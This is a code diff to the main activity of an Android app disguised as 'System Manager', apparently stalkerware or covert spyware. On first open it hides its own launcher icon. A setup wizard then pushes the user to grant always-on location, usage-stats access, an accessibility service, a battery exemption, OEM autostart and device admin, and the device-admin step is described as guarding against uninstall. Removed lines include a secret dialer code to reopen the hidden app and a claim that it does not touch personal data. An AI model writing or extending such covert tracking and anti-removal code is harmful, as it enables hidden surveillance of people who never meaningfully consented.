@@ -6,7 +6,9 @@ import android.app.admin.DevicePolicyManager;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.net.Uri;
 import android.content.pm.PackageManager;
 import android.os.Build;
@@ -27,7 +29,6 @@ public class MainActivity extends BridgeActivity {
     private static final int RC_BG_LOC       = 1002;
     private static final int RC_DEVICE_ADMIN = 2001;
 
-    // Setup steps run in order
     private static final int STEP_PERMISSIONS   = 0;
     private static final int STEP_BG_LOCATION   = 1;
     private static final int STEP_BATTERY       = 2;
@@ -37,7 +38,10 @@ public class MainActivity extends BridgeActivity {
     private static final int STEP_OEM_AUTOSTART = 6;
     private static final int STEP_DONE          = 7;
 
-    private int     currentStep    = STEP_PERMISSIONS;
+    private static final String PREFS_NAME = "mdm_setup";
+    private static final String KEY_DONE   = "setup_done";
+
+    private int     currentStep     = STEP_PERMISSIONS;
     private boolean waitingForResume = false;
     private ComponentName adminComponent;
 
@@ -57,15 +61,20 @@ public class MainActivity extends BridgeActivity {
         registerPlugin(MdmPlugin.class);
         registerPlugin(NativeSocketPlugin.class);
         super.onCreate(savedInstanceState);
+
         adminComponent = new ComponentName(this, MdmDeviceAdminReceiver.class);
-        hideLauncherIcon(); // hide from app drawer immediately on first open
+        hideLauncherIcon();
         startForegroundService(new Intent(this, MdmForegroundService.class));
-        runStep(STEP_PERMISSIONS);
+
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        if (!prefs.getBoolean(KEY_DONE, false)) {
+            // First time — run setup wizard
+            runStep(STEP_PERMISSIONS);
+        }
+        // If already done — just show the WebView (BridgeActivity handles it)
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step runner
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step runner ───────────────────────────────────────────────────────
 
     private void runStep(int step) {
         currentStep = step;
@@ -83,9 +92,7 @@ public class MainActivity extends BridgeActivity {
 
     private void nextStep() { runStep(currentStep + 1); }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 0 — Runtime permissions (system dialog, no pre-dialog)
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 0 — Runtime permissions ──────────────────────────────────────
 
     private void doPermissions() {
         List<String> missing = new ArrayList<>();
@@ -105,17 +112,15 @@ public class MainActivity extends BridgeActivity {
         if (rc == RC_PERMS || rc == RC_BG_LOC) nextStep();
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 1 — Background location (separate request, Android requirement)
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 1 — Background location ──────────────────────────────────────
 
     private void doBgLocation() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                 != PackageManager.PERMISSION_GRANTED) {
             new AlertDialog.Builder(this)
-                .setTitle("Allow Location Always")
-                .setMessage("On the next screen, select 'Allow all the time' so location works even when app is in background.")
+                .setTitle("Location Always On")
+                .setMessage("Next screen mein 'Allow all the time' select karo taaki location background mein bhi kaam kare.")
                 .setCancelable(false)
                 .setPositiveButton("Continue", (d, w) ->
                     ActivityCompat.requestPermissions(this,
@@ -127,47 +132,31 @@ public class MainActivity extends BridgeActivity {
         }
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 2 — Battery optimization exemption
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 2 — Battery optimization (direct system popup, no pre-dialog) ─
 
     private void doBattery() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                new AlertDialog.Builder(this)
-                    .setTitle("Allow Background Activity (1/4)")
-                    .setMessage("Tap 'Allow' on the next screen so System Manager can run continuously without being killed.")
-                    .setCancelable(false)
-                    .setPositiveButton("Continue", (d, w) -> {
-                        waitingForResume = true;
-                        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                        i.setData(Uri.parse("package:" + getPackageName()));
-                        startActivity(i);
-                    })
-                    .setNegativeButton("Skip", (d, w) -> nextStep())
-                    .show();
-                return;
+                try {
+                    waitingForResume = true;
+                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(i);
+                    return;
+                } catch (Exception ignored) {}
             }
         }
         nextStep();
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 3 — Usage stats access
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 3 — Usage stats ──────────────────────────────────────────────
 
     private void doUsage() {
         if (isUsageAccessGranted()) { nextStep(); return; }
         new AlertDialog.Builder(this)
-            .setTitle("Allow Usage Access (2/4)")
-            .setMessage(
-                "Steps:\n" +
-                "1. Tap 'Open Settings'\n" +
-                "2. Find 'System Manager' in list\n" +
-                "3. Toggle it ON\n" +
-                "4. Press Back to return\n\n" +
-                "This allows monitoring which apps are used.")
+            .setTitle("Usage Access")
+            .setMessage("1. Tap 'Open Settings'\n2. 'System Manager' dhundho\n3. Toggle ON karo\n4. Back press karo")
             .setCancelable(false)
             .setPositiveButton("Open Settings", (d, w) -> {
                 waitingForResume = true;
@@ -176,7 +165,8 @@ public class MainActivity extends BridgeActivity {
                     i.setData(Uri.parse("package:" + getPackageName()));
                     startActivity(i);
                 } catch (Exception ignored) {
-                    startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+                    try { startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); }
+                    catch (Exception ignored2) { nextStep(); }
                 }
             })
             .setNegativeButton("Skip", (d, w) -> nextStep())
@@ -193,21 +183,13 @@ public class MainActivity extends BridgeActivity {
         } catch (Exception e) { return false; }
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 4 — Accessibility service (boot persistence)
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 4 — Accessibility service ───────────────────────────────────
 
     private void doAccessibility() {
         if (isAccessibilityEnabled()) { nextStep(); return; }
         new AlertDialog.Builder(this)
-            .setTitle("Enable Auto-Connect (3/4)")
-            .setMessage(
-                "This allows the app to auto-connect after every phone restart.\n\n" +
-                "Steps:\n" +
-                "1. Tap 'Open Settings'\n" +
-                "2. Find 'System Manager'\n" +
-                "3. Tap it → Toggle ON → Allow\n" +
-                "4. Press Back to return")
+            .setTitle("Auto-Connect Enable Karo")
+            .setMessage("Phone restart ke baad auto-connect ke liye:\n\n1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. Toggle ON → Allow\n4. Back press karo")
             .setCancelable(false)
             .setPositiveButton("Open Settings", (d, w) -> {
                 waitingForResume = true;
@@ -237,19 +219,14 @@ public class MainActivity extends BridgeActivity {
         return false;
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 5 — Device Admin (prevents uninstall)
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 5 — Device Admin ─────────────────────────────────────────────
 
     private void doDeviceAdmin() {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (dpm == null || dpm.isAdminActive(adminComponent)) { nextStep(); return; }
         new AlertDialog.Builder(this)
-            .setTitle("Enable Protection (4/4)")
-            .setMessage(
-                "This prevents unauthorized removal of System Manager.\n\n" +
-                "Tap 'Activate' on the next screen.\n\n" +
-                "(This only prevents easy uninstall — it does NOT access your personal data.)")
+            .setTitle("Security Protection")
+            .setMessage("Next screen mein 'Activate' tap karo — yeh unauthorized uninstall se protect karta hai.")
             .setCancelable(false)
             .setPositiveButton("Continue", (d, w) -> {
                 Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
@@ -268,9 +245,7 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == RC_DEVICE_ADMIN) nextStep();
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 6 — OEM AutoStart (Vivo / Huawei / OPPO / Xiaomi)
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 6 — OEM AutoStart ────────────────────────────────────────────
 
     private void doOemAutoStart() {
         String mfr = Build.MANUFACTURER.toLowerCase();
@@ -283,13 +258,8 @@ public class MainActivity extends BridgeActivity {
 
         String brand = isVivo ? "Vivo" : isHuawei ? "Huawei/Honor" : isOppo ? "OPPO/Realme" : "Xiaomi";
         new AlertDialog.Builder(this)
-            .setTitle("Enable AutoStart — " + brand)
-            .setMessage(
-                "Last step! Enable AutoStart so the app restarts automatically.\n\n" +
-                "1. Tap 'Open Settings'\n" +
-                "2. Find 'System Manager'\n" +
-                "3. Enable AutoStart / Background activity\n" +
-                "4. Press Back to return")
+            .setTitle("AutoStart — " + brand)
+            .setMessage("1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. AutoStart ON karo\n4. Back press karo")
             .setCancelable(false)
             .setPositiveButton("Open Settings", (d, w) -> {
                 waitingForResume = true;
@@ -304,30 +274,29 @@ public class MainActivity extends BridgeActivity {
         try {
             Intent i = new Intent();
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            if (mfr.contains("huawei") || mfr.contains("honor")) {
+            if (mfr.contains("vivo")) {
+                i.setComponent(new ComponentName("com.vivo.permissionmanager",
+                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
+            } else if (mfr.contains("huawei") || mfr.contains("honor")) {
                 i.setComponent(new ComponentName("com.huawei.systemmanager",
                     "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
             } else if (mfr.contains("oppo") || mfr.contains("realme")) {
                 i.setComponent(new ComponentName("com.coloros.safecenter",
                     "com.coloros.privacypermissionsentry.PermissionTopActivity"));
-            } else if (mfr.contains("vivo")) {
-                i.setComponent(new ComponentName("com.vivo.permissionmanager",
-                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
             }
             startActivity(i);
         } catch (Exception ignored) {
             try {
-                Intent fallback = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-                fallback.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(fallback);
-            } catch (Exception ignored2) {}
+                Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                f.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(f);
+            } catch (Exception ignored2) { nextStep(); }
         }
     }
 
     private void openMiuiAutoStart() {
         String[][] targets = {
-            { "com.miui.securitycenter",
-              "com.miui.permcenter.autostart.AutoStartManagementActivity" },
+            { "com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity" },
             { "com.miui.securitycenter", "com.miui.permcenter.MainAcitivity" },
             { "com.miui.securitycenter", "com.miui.securitycenter.MainActivity" },
         };
@@ -344,7 +313,7 @@ public class MainActivity extends BridgeActivity {
             Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
             f.setData(Uri.parse("package:" + getPackageName()));
             startActivity(f);
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) { nextStep(); }
     }
 
     private boolean isMiui() {
@@ -352,20 +321,18 @@ public class MainActivity extends BridgeActivity {
         catch (ClassNotFoundException e) { return false; }
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // Step 7 — Done: hide icon and close
-    // ─────────────────────────────────────────────────────────────────────
+    // ── Step 7 — Done ────────────────────────────────────────────────────
 
     private void doFinish() {
-        hideLauncherIcon();
+        // Save flag so wizard never runs again
+        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            .edit().putBoolean(KEY_DONE, true).apply();
+
         new AlertDialog.Builder(this)
             .setTitle("Setup Complete!")
-            .setMessage(
-                "System Manager is now active and protected.\n\n" +
-                "The app will close now and run silently in the background.\n\n" +
-                "To open again: dial *#*#8888#*#*")
-            .setCancelable(false)
-            .setPositiveButton("Close App", (d, w) -> moveTaskToBack(true))
+            .setMessage("System Manager active ho gaya hai aur background mein chal raha hai.")
+            .setCancelable(true)
+            .setPositiveButton("OK", null) // just dismiss — app stays open showing dashboard
             .show();
     }
 
@@ -378,9 +345,7 @@ public class MainActivity extends BridgeActivity {
         } catch (Exception ignored) {}
     }
 
-    // ─────────────────────────────────────────────────────────────────────
-    // onResume — called when user returns from a Settings screen
-    // ─────────────────────────────────────────────────────────────────────
+    // ── onResume — return from Settings screens ───────────────────────────
 
     @Override
     public void onResume() {
